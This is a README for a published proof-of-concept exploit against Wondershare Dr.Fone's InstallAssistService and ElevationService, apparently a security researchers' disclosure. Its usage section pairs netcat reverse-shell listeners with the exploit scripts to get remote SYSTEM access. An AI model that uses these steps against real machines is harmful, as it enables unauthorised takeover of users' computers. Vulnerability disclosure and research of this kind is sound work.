# WonderShell - CVE - 2021-4459 | CVE - 2021-44596


## Discovered by
Netanel Cohen and Tomer Peled a Security Researchers from BugSec.

## Description
POC example to exploit [Wondershare Dr.Fone](https://drfone.wondershare.com/) .\
Dr.Fone is a phone toolkit develop by wondershare , and vulnerable to RCE.\
Only with network access we manage to execute remote code as SYSTEM user.

Vulnerable services:
>InstallAssistService.exe\
>ElevationService.exe

Tested on versions : 12.0.7 , 11.4

## Usage
Change ip and port and execute.

```
stty raw -echo; (stty size; cat) | nc -lvnp 1338
./ElevationServiceRCE.py
```

```
nc -lvnp 1337
./InstallAssistServiceRCE.py
```


## Publications
https://medium.com/@tomerp_77017/wondershell-a82372914f26




